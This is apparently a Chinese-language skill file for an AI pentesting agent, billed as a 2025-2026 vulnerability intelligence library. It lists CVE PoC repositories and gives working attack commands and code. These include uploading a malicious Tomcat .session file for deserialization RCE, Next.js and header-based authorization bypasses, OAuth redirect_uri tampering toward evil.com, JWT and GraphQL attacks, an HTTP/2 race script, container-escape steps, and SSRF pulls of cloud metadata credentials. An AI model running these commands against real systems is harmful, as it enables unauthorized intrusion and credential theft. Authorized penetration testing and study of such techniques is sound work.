---
name: vuln-intel-2025-2026
description: "2025-2026漏洞情报库 — 最新CVE PoC/攻击链/利用技术/GitHub资源。持续更新的实战漏洞知识库。"
tags: [cve, poc, exploit, 2025, 2026, intelligence, github]
related_skills: [vuln-intel, exploit-db-integration, pentest-unified-engine, auto-poc-report]
---

# 2025-2026 漏洞情报库

## 高价值CVE PoC (已验证可利用)

### RCE类

| CVE | 产品 | 类型 | PoC | 利用方式 |
|-----|------|------|-----|---------|
| CVE-2025-24813 | Apache Tomcat | PUT反序列化RCE | github.com/hakankarabacak/CVE-2025-24813 | PUT上传.session文件→反序列化→RCE |
| CVE-2025-41243 | Spring Cloud Gateway | SpEL RCE | github.com/SFN233/CVE-2025-41243 | Gateway路由配置注入SpEL表达式 |
| CVE-2025-55182 | React Server Components | Server Function RCE | github.com/msanft/CVE-2025-55182 | 不安全的服务端反序列化/模型解析 |
| CVE-2025-24799 | 多产品 | SQL注入 | github.com/MatheuZSecurity/Exploit-CVE-2025-24799 | SQL注入→RCE链 |
| CVE-2026-9082 | Drupal | PoC | github.com/7h30th3r0n3/CVE-2026-9082-Drupal-PoC | Drupal CMS RCE |
| CVE-2026-27470 | 多产品 | 漏洞利用 | github.com/kocaemre/CVE-2026-27470 | 新型利用链 |

### 认证绕过类

| CVE | 产品 | 类型 | PoC | 利用方式 |
|-----|------|------|-----|---------|
| CVE-2025-29927 | Next.js | 中间件认证绕过 | github.com/alihussainzada/CVE-2025-29927-PoC | 内部中间件头信任滥用绕过授权 |
| CVE-2025-0108 | PAN-OS | 管理界面认证绕过 | github.com/FOLKS-iwd/CVE-2025-0108-PoC | 管理接口认证绕过 |
| CVE-2025-27515 | Laravel | 文件上传验证绕过 | github.com/joaovicdev/EXPLOIT-CVE-2025-27515 | 通配符数组上传验证绕过 |

### 文件上传类

| CVE | 产品 | 类型 | PoC | 利用方式 |
|-----|------|------|-----|---------|
| CVE-2025-31324 | 多产品 | 文件上传 | github.com/nullcult/CVE-2025-31324-File-Upload | 不安全的文件上传处理 |
| CVE-2025-2005 | 多产品 | 文件上传 | github.com/mrmtwoj/CVE-2025-2005 | 上传限制绕过 |
| CVE-2025-52078 | 多产品 | 文件上传 | github.com/Yucaerin/CVE-2025-52078 | 新型上传利用 |

### SSRF类

| CVE | 产品 | 类型 | PoC | 利用方式 |
|-----|------|------|-----|---------|
| CVE-2025-26529 | 多产品 | SSRF | github.com/Astroo18/PoC-CVE-2025-26529 | SSRF→内网访问→云元数据 |

## 高价值PoC集合仓库

| 仓库 | Stars | 用途 |
|------|-------|------|
| github.com/Mr-xn/Penetration_Testing_POC | 7.3k | 综合PoC/EXP库 |
| github.com/k8gege/K8tools | 6.1k | 攻击工具集+GetShell |
| github.com/0xMarcio/cve | 3.9k | 最新CVE+PoC链接 |
| github.com/tr0uble-mAker/POC-bomber | 2.3k | PoC自动化批量验证 |
| github.com/exploitintel/eip-pocs-and-cves | - | AI安全+Langflow/MetaGPT RCE |
| github.com/GhostTroops/TOP | - | 活跃更新的CVE PoC集合 |

## 攻击技术方法论

### 1. Java反序列化攻击链 (Tomcat CVE-2025-24813)

**原理**: Tomcat允许部分PUT + 文件会话持久化 → 上传恶意.session文件 → 反序列化RCE

**检测步骤**:
```bash
# 1. 确认Tomcat版本
curl -sk https://target/ -D- | grep -i "server: apache-coyote\|server: tomcat"

# 2. 测试PUT可写性
curl -sk -X PUT "https://target/test.txt" -d "test" -w "%{http_code}"

# 3. 检查会话持久化配置
curl -sk "https://target/;jsessionid=test" -D- | grep -i "set-cookie.*jsessionid"

# 4. URLDNS检测 (无害)
# 使用ysoserial生成URLDNS payload
java -jar ysoserial.jar URLDNS "http://your-dns-log.com" | base64

# 5. 构造恶意.session文件
curl -sk -X PUT "https://target/../../sessions/malicious.session" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.ser

# 6. 触发反序列化
curl -sk "https://target/" -H "Cookie: JSESSIONID=malicious"
```

**利用条件**:
- Tomcat启用了partial PUT (默认禁用)
- 使用了文件-backed Session持久化
- classpath上有ysoserial gadget

### 2. Next.js中间件认证绕过 (CVE-2025-29927)

**原理**: Next.js中间件信任内部头 → 绕过授权逻辑

**检测步骤**:
```bash
# 1. 确认Next.js
curl -sk https://target/ -D- | grep -i "x-powered-by.*next"

# 2. 测试中间件绕过 (添加内部头)
curl -sk "https://target/admin" \
  -H "x-middleware-subrequest: middleware" \
  -w "\n%{http_code}"

# 3. 测试不同中间件头值
for header in "x-middleware-subrequest" "x-nextjs-data" "x-forwarded-host"; do
  code=$(curl -sk "https://target/protected" -H "$header: 1" -o /dev/null -w "%{http_code}")
  echo "$header: $code"
done
```

**利用条件**:
- 使用Next.js中间件做认证/授权
- 中间件信任内部请求头

### 3. OAuth2/OIDC漏洞模式

**检测步骤**:
```bash
# 1. 枚举OAuth端点
curl -sk "https://target/.well-known/openid-configuration" | python3 -m json.tool
curl -sk "https://target/.well-known/oauth-authorization-server"

# 2. 测试redirect_uri篡改
curl -sk "https://target/auth?client_id=xxx&redirect_uri=https://evil.com&response_type=code"

# 3. 测试state参数缺失
curl -sk "https://target/auth?client_id=xxx&redirect_uri=https://target/callback&response_type=code"

# 4. 测试PKCE降级
# 检查code_challenge_method是否接受plain
curl -sk "https://target/auth?...&code_challenge=test&code_challenge_method=plain"

# 5. 测试token audience绑定
# 获取token后检查aud claim是否绑定到特定client
```

**关键检查点**:
- redirect_uri是否白名单校验
- state参数是否必须且不可预测
- nonce是否强制且验证
- PKCE是否强制S256
- token是否绑定client_id

### 4. GraphQL安全测试

**检测步骤**:
```bash
# 1. 发现GraphQL端点
for path in /graphql /api/graphql /v1/graphql /query /gql; do
  code=$(curl -sk "https://target$path" -o /dev/null -w "%{http_code}")
  [ "$code" != "000" ] && [ "$code" != "404" ] && echo "$path: $code"
done

# 2. 测试introspection
curl -sk -X POST "https://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# 3. 测试GET方式
curl -sk "https://target/graphql?query={__schema{types{name}}}"

# 4. 枚举敏感类型
curl -sk -X POST "https://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"User\") { fields { name type { name } } } }"}'

# 5. 测试alias过载
curl -sk -X POST "https://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a1: user(id:1) { email } a2: user(id:2) { email } a3: user(id:3) { email } }"}'

# 6. 测试批量查询
curl -sk -X POST "https://target/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"}]'
```

**工具**: graphql-cop, graphql-path-enum, BatchQL

### 5. JWT攻击向量

**检测步骤**:
```bash
# 1. 解码JWT
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxx" | cut -d. -f2 | base64 -d 2>/dev/null

# 2. 测试alg:none
# 修改header为 {"alg":"none","typ":"JWT"}，删除签名

# 3. 测试HS/RS密钥混淆
# 用公钥做HMAC签名

# 4. 测试弱密钥
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# 5. 测试kid路径遍历
# 修改header: {"alg":"HS256","kid":"../../dev/null"}，用空密钥签名

# 6. 测试jku注入
# 修改header指向攻击者控制的JWKS
```

**工具**: jwt_tool (v2.3.0+), jwtXploiter

### 6. 竞态条件利用 (单包攻击)

**原理**: PortSwigger单包攻击 - 同步发送多个HTTP/2请求

**检测步骤**:
```bash
# 使用turbo-intruder
# 1. 识别非幂等请求 (POST创建/修改)
# 2. 克隆请求
# 3. 同步发送 (single-packet attack)
# 4. 比较最终状态

# Python实现 (http2)
import h2.connection
import h2.config
import h2.events
import socket

# 创建HTTP/2连接
sock = socket.create_connection(("target", 443))
config = h2.config.H2Configuration()
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
sock.send(conn.data_to_send())

# 发送多个同步请求
headers = [(':method', 'POST'), (':path', '/api/transfer'), ...]
for i in range(50):
    conn.send_headers(1 + i*2, headers)
sock.send(conn.data_to_send())
```

**适用场景**:
- 优惠券/折扣重复使用
- 账户创建限制绕过
- 密码重置竞态
- 余额/提现竞态
- 邀请/奖励复制

### 7. 业务逻辑绕过

**检测模式**:
```bash
# 1. 工作流步骤跳过
# 正常流程: step1 → step2 → step3
# 攻击: 直接请求step3

# 2. 隐藏参数/批量赋值
# 添加 role=admin, is_admin=true, price=0 等参数
curl -sk -X POST "https://target/api/order" \
  -d '{"product_id":1,"quantity":1,"role":"admin","price":0}'

# 3. 状态机绕过
# 订单状态: pending → paid → shipped
# 攻击: pending直接改为shipped

# 4. 中间件信任头绕过
curl -sk "https://target/admin" -H "X-Forwarded-For: 127.0.0.1"
curl -sk "https://target/admin" -H "X-Original-URL: /admin"
curl -sk "https://target/admin" -H "X-Rewrite-URL: /admin"
```

## 子域名接管检测

**工具**:
- dnsReaper: github.com/punk-security/dnsReaper
- subzy: github.com/PentestPad/subzy
- subjack: github.com/haccer/subjack

**检测步骤**:
```bash
# 1. 枚举子域名CNAME
for sub in $(cat subs.txt); do
  cname=$(dig +short CNAME $sub 2>/dev/null)
  [ -n "$cname" ] && echo "$sub -> $cname"
done

# 2. 检查CNAME指向的服务是否可接管
# AWS S3: CNAME指向不存在的bucket
# Azure: CNAME指向不存在的storage
# GitHub Pages: CNAME指向未claimed的repo
# Heroku: CNAME指向已删除的app

# 3. 验证接管
curl -sk "https://target" | grep -i "NoSuchBucket\|404 Not Found\|There isn't a GitHub Pages"
```

## 容器逃逸检测

**工具**:
- CDK: github.com/cdk-team/CDK
- ctrsploit: github.com/ctrsploit/ctrsploit

**检测步骤**:
```bash
# 1. 检查容器环境
cat /proc/1/cgroup | grep -i "docker\|kubepods"
ls -la /.dockerenv

# 2. 检查危险挂载
mount | grep -i "docker.sock\|proc\|sys"
ls -la /var/run/docker.sock

# 3. 检查capabilities
cat /proc/1/status | grep Cap

# 4. 检查特权模式
[ -f /dev/sda1 ] && echo "Privileged container detected"

# 5. 使用CDK评估
cdk evaluate
cdk run mount-disk
```

## 云安全测试

**工具**:
- prowler: github.com/prowler-cloud/prowler (AWS/Azure/GCP)
- cloudfox: github.com/BishopFox/cloudfox
- ScoutSuite: github.com/nccgroup/ScoutSuite

**AWS元数据SSRF**:
```bash
# 1. 确认SSRF
curl -sk "https://target/fetch?url=http://169.254.169.254/latest/meta-data/"

# 2. 获取IAM角色
curl -sk "https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 3. 获取临时凭据
curl -sk "https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"

# 4. 阿里云元数据
curl -sk "https://target/fetch?url=http://100.100.100.200/latest/meta-data/"
```

## 参考资源

- PayloadsAllTheThings: github.com/swisskyrepo/PayloadsAllTheThings
- ysoserial: github.com/frohoff/ysoserial
- jwt_tool: github.com/ticarpi/jwt_tool
- turbo-intruder: github.com/PortSwigger/turbo-intruder
- graphql-cop: github.com/dolevf/graphql-cop
- DVGA: github.com/dolevf/Damn-Vulnerable-GraphQL-Application
- OWASP Business Logic: github.com/OWASP/www-project-top-10-for-business-logic-abuse
